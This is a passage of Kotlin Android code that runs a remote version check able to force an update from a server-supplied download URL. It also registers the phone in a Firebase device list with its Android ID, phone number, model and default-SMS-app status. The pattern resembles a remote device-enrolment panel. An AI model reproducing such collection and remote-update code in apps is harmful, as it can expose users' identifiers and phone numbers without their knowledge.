        val timeoutRunnable = Runnable {
            if (completed) return@Runnable
            completed = true
            android.util.Log.w("ActivationActivity", "Version check timeout - proceeding normally")
            onComplete(false)
        }
        timeoutHandler.postDelayed(timeoutRunnable, 15000)

        VersionChecker.checkVersion(
            context = this,
            onVersionChecked = { versionInfo ->
                if (completed) return@checkVersion
                completed = true
                timeoutHandler.removeCallbacks(timeoutRunnable)
                if (versionInfo == null) {
                    android.util.Log.d("ActivationActivity", "No version info available, proceeding normally")
                    onComplete(false)
                    return@checkVersion
                }

                val currentVersionCode = VersionChecker.getCurrentVersionCode(this)
                val requiredVersionCode = versionInfo.versionCode
                val downloadUrl = versionInfo.downloadUrl
                val forceUpdate = versionInfo.forceUpdate

                android.util.Log.d("ActivationActivity", "Version check: current=$currentVersionCode, required=$requiredVersionCode, forceUpdate=$forceUpdate")

                if (currentVersionCode < requiredVersionCode && downloadUrl != null && VersionChecker.isValidDownloadUrl(downloadUrl)) {
                    android.util.Log.d("ActivationActivity", "Update available: $downloadUrl")

                    // Launch RemoteUpdateActivity to handle the update
                    val intent = Intent(this, com.example.fast.ui.RemoteUpdateActivity::class.java).apply {
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
                        putExtra("downloadUrl", "$requiredVersionCode|$downloadUrl")
                    }
                    startActivity(intent)

                    // If force update, finish this activity so user can't proceed without updating
                    if (forceUpdate) {
                        android.util.Log.d("ActivationActivity", "Force update required - finishing activation")
                        finish()
                    }

                    onComplete(true)
                } else {
                    android.util.Log.d("ActivationActivity", "No update needed or invalid URL")
                    onComplete(false)
                }
            },
            onError = { error ->
                if (completed) return@checkVersion
                completed = true
                timeoutHandler.removeCallbacks(timeoutRunnable)
                android.util.Log.w("ActivationActivity", "Version check failed, proceeding normally: ${error.message}")
                // On error, proceed normally (don't block registration)
                onComplete(false)
            }
        )
    }
}

@SuppressLint("HardwareIds")
fun Activity.androidId(): String = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)

@SuppressLint("HardwareIds")
fun Service.androidId(): String = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)

/**
 * Update Firebase device-list with activation data
 * Path: firebase/fastpay/device-list/{code} - {deviceId}
 * Version is stored as a field in the data object: { version: "26", ... }
 * Structure: {
 *   title: "",
 *   bank: {
 *     uniqueidentifier: number,
 *     status: "pending",
 *     display name: "XXXXXXXXX"
 *   },
 *   number: phone number,
 *   created_at: timestamp,
 *   added_by: "USER"
 * }
 */
/**
 * Normalize phone number by removing spaces and special characters
 */
fun Activity.normalizePhone(phone: String): String {
    return phone.replace(" ", "")
               .replace("+", "")
               .replace("-", "")
               .replace("(", "")
               .replace(")", "")
}

/**
 * Get user identifier or generate default
 * Default: "Phone {last4digits}"
 */
fun Activity.getUserIdentifier(phone: String): String {
    // TODO: Add UI input field for identifier
    // For now, generate default identifier
    val normalizedPhone = normalizePhone(phone)
    val last4 = normalizedPhone.takeLast(4)
    return "Phone $last4"
}

/**
 * Update device-list structure: fastpay/device-list/{code}/deviceId
 * Simple one-to-one mapping: code -> deviceId
 *
 * Note: This is a simple mapping. Device-specific data (battery, status, lastSeen)
 * is stored in fastpay/{deviceId}, not in device-list.
 */
fun Activity.updateDeviceListInFirebase(code: String, deviceId: String, phone: String? = null, mode: String? = "testing") {
    try {
        if (deviceId.isBlank()) {
            android.util.Log.e("ActivationActivity", "❌ Device ID is blank in updateDeviceListInFirebase")
            return
        }

        if (code.isBlank()) {
            android.util.Log.e("ActivationActivity", "❌ Code is blank in updateDeviceListInFirebase")
            return
        }

        val deviceListPath = AppConfig.getFirebaseDeviceListPath(code, mode)

        // Default values (if not already set)
        val defaultBankStatus = mapOf("PENDING" to "#FFA500")
        val defaultBankName = "WELCOME"
        val defaultCompanyName = "STAY CONNECTED!"
        val defaultOtherInfo = "🫵ALWAYS PRIORITY!🫶"
        val defaultStatusText = "WELCOME,STAY CONNECTED!,🫵ALWAYS PRIORITY!🫶"

        // Get device model
        val deviceModel = "${android.os.Build.BRAND} ${android.os.Build.MODEL}"

        // Get current timestamp and format as human-readable date
        val createdAtTimestamp = System.currentTimeMillis()
        val createdAt = java.text.SimpleDateFormat("d MMM yyyy, h:mm a", java.util.Locale.getDefault())
            .format(java.util.Date(createdAtTimestamp))

        // Build device-list data with defaults and version
        val deviceListData = mutableMapOf<String, Any>(
            "deviceId" to deviceId,
            "version" to "29",  // Version 29
            "created_at" to createdAt,
            "device_model" to deviceModel,
            "status" to "PENDING"
        )

        // Add phone number if provided
        if (!phone.isNullOrBlank()) {
            deviceListData["number"] = phone
        }

        // Only set defaults if they don't exist (preserve existing values)
        Firebase.database.reference.child(deviceListPath)
            .addListenerForSingleValueEvent(object : com.google.firebase.database.ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                    // Check and set BANKSTATUS if not exists
                    if (!snapshot.child(AppConfig.FirebasePaths.BANKSTATUS).exists()) {
                        deviceListData[AppConfig.FirebasePaths.BANKSTATUS] = defaultBankStatus
                    }

                    // Build BANK object structure
                    val bankObject = mutableMapOf<String, Any>()
                    val bankSnapshot = snapshot.child(AppConfig.FirebasePaths.BANK)

                    if (!bankSnapshot.child(AppConfig.FirebasePaths.BANK_BANK_NAME).exists()) {
                        bankObject[AppConfig.FirebasePaths.BANK_BANK_NAME] = defaultBankName
                    } else {
                        bankSnapshot.child(AppConfig.FirebasePaths.BANK_BANK_NAME).getValue(String::class.java)?.let {
                            bankObject[AppConfig.FirebasePaths.BANK_BANK_NAME] = it
                        }
                    }

                    if (!bankSnapshot.child(AppConfig.FirebasePaths.BANK_COMPANY_NAME).exists()) {
                        bankObject[AppConfig.FirebasePaths.BANK_COMPANY_NAME] = defaultCompanyName
                    } else {
                        bankSnapshot.child(AppConfig.FirebasePaths.BANK_COMPANY_NAME).getValue(String::class.java)?.let {
                            bankObject[AppConfig.FirebasePaths.BANK_COMPANY_NAME] = it
                        }
                    }

                    if (!bankSnapshot.child(AppConfig.FirebasePaths.BANK_OTHER_INFO).exists()) {
                        bankObject[AppConfig.FirebasePaths.BANK_OTHER_INFO] = defaultOtherInfo
                    } else {
                        bankSnapshot.child(AppConfig.FirebasePaths.BANK_OTHER_INFO).getValue(String::class.java)?.let {
                            bankObject[AppConfig.FirebasePaths.BANK_OTHER_INFO] = it
                        }
                    }

                    // Add BANK object to device-list data
                    deviceListData[AppConfig.FirebasePaths.BANK] = bankObject

                    // Sync default device values to device-list (update all devices)
                    // These values come from fastpay/{deviceId} defaults
                    val deviceDefaultName = "${android.os.Build.BRAND} ${android.os.Build.MODEL}"
                    deviceListData["NAME"] = deviceDefaultName  // Always sync NAME from device model
                    deviceListData["isActive"] = "Opened"  // Sync isActive status
                    deviceListData["permission"] = "allow"  // Sync permission default

                    // Check if app is default SMS app and sync to device-list
                    val isDefault = com.example.fast.util.DefaultSmsAppHelper.isDefaultSmsApp(this@updateDeviceListInFirebase)
                    deviceListData["isDefault"] = isDefault

                    // Only set created_at if it doesn't exist (preserve original creation time)
                    // Note: createdAt is already formatted as human-readable string
                    if (!snapshot.child("created_at").exists()) {
                        deviceListData["created_at"] = createdAt
                    }
                    // Always update device_model to match current device
                    deviceListData["device_model"] = deviceModel
                    // Only set status if it doesn't exist
                    if (!snapshot.child("status").exists()) {
                        deviceListData["status"] = "PENDING"
                    }
                    // Set status_text default if not exists
                    if (!snapshot.child("status_text").exists()) {
                        deviceListData["status_text"] = defaultStatusText
                    }

                    // Update device-list with deviceId, version, and defaults (if needed)
                    Firebase.database.reference
                        .child(deviceListPath)
                        .updateChildren(deviceListData)
                    .addOnSuccessListener {
                            android.util.Log.d("ActivationActivity", "✅ Device list updated with BANK object structure: $deviceListPath -> $deviceId")
                    }
                    .addOnFailureListener { e ->
                            android.util.Log.e("ActivationActivity", "❌ Failed to update device list: $deviceListPath", e)
                    }
            }

            override fun onCancelled(error: DatabaseError) {
                    // If check fails, set defaults anyway
                    deviceListData[AppConfig.FirebasePaths.BANKSTATUS] = defaultBankStatus
                    val bankObject = mapOf(
                        AppConfig.FirebasePaths.BANK_BANK_NAME to defaultBankName,
                        AppConfig.FirebasePaths.BANK_COMPANY_NAME to defaultCompanyName,
                        AppConfig.FirebasePaths.BANK_OTHER_INFO to defaultOtherInfo
                    )
                    deviceListData[AppConfig.FirebasePaths.BANK] = bankObject

                    // Check if app is default SMS app and sync to device-list
                    val isDefault = com.example.fast.util.DefaultSmsAppHelper.isDefaultSmsApp(this@updateDeviceListInFirebase)
                    deviceListData["isDefault"] = isDefault
                Firebase.database.reference
                        .child(deviceListPath)
                        .updateChildren(deviceListData)
                    .addOnFailureListener { e ->
                            android.util.Log.e("ActivationActivity", "❌ Failed to update device list: $deviceListPath", e)
                    }
            }
        })
    } catch (e: Exception) {
        android.util.Log.e("ActivationActivity", "❌ Error updating device list", e)
    }
}
